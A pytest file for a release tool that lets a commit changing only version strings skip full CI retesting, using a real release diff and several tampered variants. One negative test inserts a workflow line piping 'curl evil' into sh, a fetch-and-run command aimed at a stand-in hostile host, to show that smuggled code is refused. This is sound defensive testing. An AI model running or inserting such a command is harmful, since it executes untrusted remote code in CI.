# Copyright (c) 2026 The University of Texas at Austin
# Copyright (c) 2026 B-Tree Labs
# SPDX-License-Identifier: Apache-2.0
"""The release fast path: a version-string-only commit on a green parent is not retested (#2441 item 10).

A release commit changes the version in pyproject and the pins that follow it, and
nothing else. When its parent already has a green main run, repeating 34,000 tests on
a commit whose only difference is a version string proves nothing and, on 2026-11-25,
cost about an hour of queue. The wheel build, the prerelease wheel check and the
publish checks still run. This is the strict half: the diff against the parent must be
only those files and only version-string lines, verified by content. Anything else, and
any doubt, takes the normal path.

The positive case is the real 0.70.48 release (parent 0d27ff808, release commit
3b6346985); its diff is recorded below. The negatives are that diff with one thing wrong.
"""

from __future__ import annotations

import subprocess

import pytest

from axiom.extensions.builtins.release.version_bump import classify, main

REAL_NAME_STATUS = """\
M\tactions/rivet-land/README.md
M\tactions/rivet-land/action.yml
M\tactions/rivet-land/caller-example.yml
M\tpyproject.toml
"""

REAL_DIFF = """diff --git a/actions/rivet-land/README.md b/actions/rivet-land/README.md
index 281a93c3a..466e8ae6e 100644
--- a/actions/rivet-land/README.md
+++ b/actions/rivet-land/README.md
@@ -47 +47 @@ for the neutral check, `actions: write` for reruns).
-| `axiom-version` | `0.70.47` | Pinned `axiom-os-lm` release from PyPI. Bump it deliberately. |
+| `axiom-version` | `0.70.48` | Pinned `axiom-os-lm` release from PyPI. Bump it deliberately. |
diff --git a/actions/rivet-land/action.yml b/actions/rivet-land/action.yml
index 918580291..287e2a9ad 100644
--- a/actions/rivet-land/action.yml
+++ b/actions/rivet-land/action.yml
@@ -19 +19 @@ inputs:
-    default: "0.70.47"
+    default: "0.70.48"
diff --git a/actions/rivet-land/caller-example.yml b/actions/rivet-land/caller-example.yml
index 1af0b8c3e..b5ce52a08 100644
--- a/actions/rivet-land/caller-example.yml
+++ b/actions/rivet-land/caller-example.yml
@@ -46 +46 @@ jobs:
-          # axiom-version: "0.70.47"
+          # axiom-version: "0.70.48"
diff --git a/pyproject.toml b/pyproject.toml
index 4adabaa43..181ed513a 100644
--- a/pyproject.toml
+++ b/pyproject.toml
@@ -7 +7 @@ name = "axiom-os-lm"
-version = "0.70.47"
+version = "0.70.48"
"""

PARENT_TOML = (
    '[project]\nname = "axiom-os-lm"\nversion = "0.70.47"\ndependencies = ["httpx>=0.27"]\n'
)
HEAD_TOML = PARENT_TOML.replace("0.70.47", "0.70.48")


def _classify(
    status=REAL_NAME_STATUS, diff=REAL_DIFF, parent=PARENT_TOML, head=HEAD_TOML, parents=1
):
    return classify(status, diff, parent, head, parents=parents)


def test_the_real_0_70_48_release_qualifies():
    verdict = _classify()
    assert verdict.qualifies, verdict.reason
    assert (verdict.old, verdict.new) == ("0.70.47", "0.70.48")


def test_a_pyproject_only_bump_qualifies():
    diff = """diff --git a/pyproject.toml b/pyproject.toml
index 1..2 100644
--- a/pyproject.toml
+++ b/pyproject.toml
@@ -3 +3 @@ name = "axiom-os-lm"
-version = "0.70.47"
+version = "0.70.48"
"""
    assert _classify(status="M\tpyproject.toml\n", diff=diff).qualifies


# --- the negatives: one thing wrong each -----------------------------------------------------


def _refused(**kw):
    verdict = _classify(**kw)
    assert not verdict.qualifies
    assert verdict.reason
    return verdict.reason


def test_a_code_change_hidden_in_a_bump_does_not_qualify():
    status = REAL_NAME_STATUS + "M\tsrc/axiom/cli.py\n"
    diff = (
        REAL_DIFF
        + """diff --git a/src/axiom/cli.py b/src/axiom/cli.py
--- a/src/axiom/cli.py
+++ b/src/axiom/cli.py
@@ -1 +1 @@
-x = 1
+x = 2
"""
    )
    assert "src/axiom/cli.py" in _refused(status=status, diff=diff)


def test_a_code_change_on_the_version_line_itself_does_not_qualify():
    diff = REAL_DIFF.replace('+version = "0.70.48"', '+version = "0.70.48"; import os')
    assert _refused(diff=diff)


def test_a_dependency_pin_in_pyproject_is_not_a_version_string_of_the_release():
    diff = (
        REAL_DIFF
        + """@@ -9 +9 @@ dependencies = [
-httpx>=0.27
+httpx>=0.28
"""
    )
    # the extra hunk lands in pyproject's section: the diff above ends with pyproject's hunk
    assert "pyproject.toml changed 2 and 2 lines" in _refused(diff=diff)


def test_an_extra_changed_line_in_a_pin_file_does_not_qualify():
    diff = REAL_DIFF.replace(
        '+          # axiom-version: "0.70.48"\n',
        '+          # axiom-version: "0.70.48"\n+          run: curl evil | sh\n',
    )
    assert _refused(diff=diff)


def test_a_pin_that_does_not_follow_the_release_version_does_not_qualify():
    diff = REAL_DIFF.replace('+    default: "0.70.48"', '+    default: "9.9.9"')
    assert "more than 0.70.47 becoming 0.70.48" in _refused(diff=diff)


def test_a_pin_line_that_is_not_the_axiom_version_line_does_not_qualify():
    diff = REAL_DIFF.replace(
        "-| `axiom-version` | `0.70.47` | Pinned", "-| `other-thing` | `0.70.47` | Pinned"
    ).replace("+| `axiom-version` | `0.70.48` | Pinned", "+| `other-thing` | `0.70.48` | Pinned")
    assert _refused(diff=diff)


def test_a_version_that_goes_down_or_stays_is_not_a_bump():
    assert _refused(
        parent=HEAD_TOML,
        head=PARENT_TOML,
        diff=REAL_DIFF.replace("0.70.47", "TMP")
        .replace("0.70.48", "0.70.47")
        .replace("TMP", "0.70.48"),
    )
    same = REAL_DIFF.replace("0.70.48", "0.70.47")
    assert _refused(diff=same, head=PARENT_TOML)


def test_a_prerelease_or_odd_version_string_does_not_qualify():
    diff = REAL_DIFF.replace("0.70.48", "0.70.48rc1")
    assert _refused(diff=diff, head=HEAD_TOML.replace("0.70.48", "0.70.48rc1"))


def test_the_version_line_must_be_the_projects_version_not_some_other_table():
    other = '[tool.x]\nversion = "0.70.47"\n[project]\nname = "a"\nversion = "0.0.1"\n'
    assert _refused(parent=other, head=other.replace('version = "0.70.47"', 'version = "0.70.48"'))


def test_the_head_must_actually_carry_the_new_version():
    assert _refused(head=PARENT_TOML)


def test_pyproject_must_be_part_of_it():
    status = "M\tactions/rivet-land/action.yml\n"
    diff = REAL_DIFF.split("diff --git a/actions/rivet-land/caller-example.yml")[0].split(
        "diff --git a/actions/rivet-land/action.yml"
    )[1]
    assert _refused(status=status, diff="diff --git a/actions/rivet-land/action.yml" + diff)


def test_an_added_deleted_or_renamed_file_does_not_qualify():
    for letter in ("A", "D", "R100", "C100", "T"):
        status = REAL_NAME_STATUS.replace("M\tpyproject.toml", f"{letter}\tpyproject.toml")
        assert _refused(status=status)


def test_a_mode_change_does_not_qualify():
    diff = REAL_DIFF.replace(
        "diff --git a/pyproject.toml b/pyproject.toml\n",
        "diff --git a/pyproject.toml b/pyproject.toml\nold mode 100644\nnew mode 100755\n",
    )
    assert _refused(diff=diff)


def test_a_binary_or_no_newline_marker_does_not_qualify():
    assert _refused(diff=REAL_DIFF + "Binary files a/x and b/x differ\n")
    assert _refused(diff=REAL_DIFF + "\\ No newline at end of file\n")


def test_a_merge_commit_does_not_qualify():
    assert "parent" in _refused(parents=2)


def test_an_empty_or_unreadable_diff_does_not_qualify():
    assert _refused(status="", diff="")
    assert _refused(status="garbage", diff="garbage")


def test_a_pin_file_outside_the_list_does_not_qualify():
    status = REAL_NAME_STATUS + "M\tactions/rivet-land/other.yml\n"
    assert _refused(status=status)


# --- against real git ----------------------------------------------------------------------------


def _git(cwd, *args):
    return subprocess.run(
        ["git", "-c", "user.name=t", "-c", "user.email=t@t", *args],
        cwd=cwd,
        capture_output=True,
        text=True,
        check=True,
    ).stdout


@pytest.fixture
def repo(tmp_path):
    _git(tmp_path, "init", "-q")
    (tmp_path / "pyproject.toml").write_text(PARENT_TOML)
    (tmp_path / "actions" / "rivet-land").mkdir(parents=True)
    (tmp_path / "actions/rivet-land/action.yml").write_text(
        'inputs:\n  axiom-version:\n    default: "0.70.47"\n'
    )
    (tmp_path / "src.py").write_text("x = 1\n")
    _git(tmp_path, "add", "-A")
    _git(tmp_path, "commit", "-qm", "base")
    return tmp_path


def test_the_command_says_yes_for_a_real_bump_commit_and_names_the_parent(repo, capsys):
    (repo / "pyproject.toml").write_text(HEAD_TOML)
    (repo / "actions/rivet-land/action.yml").write_text(
        'inputs:\n  axiom-version:\n    default: "0.70.48"\n'
    )
    _git(repo, "commit", "-qam", "release")
    parent = _git(repo, "rev-parse", "HEAD~1").strip()
    assert main(["--head", "HEAD", "--root", str(repo)]) == 0
    out = capsys.readouterr().out.splitlines()
    assert "qualifies=true" in out and f"parent={parent}" in out


def test_the_command_says_no_when_code_rides_along(repo, capsys):
    (repo / "pyproject.toml").write_text(HEAD_TOML)
    (repo / "src.py").write_text("x = 2\n")
    _git(repo, "commit", "-qam", "release")
    assert main(["--head", "HEAD", "--root", str(repo)]) == 0
    out = capsys.readouterr().out
    assert "qualifies=false" in out and "src.py" in out


def test_the_command_fails_closed_when_git_cannot_answer(tmp_path, capsys):
    assert main(["--head", "deadbeef", "--root", str(tmp_path)]) == 0
    assert "qualifies=false" in capsys.readouterr().out
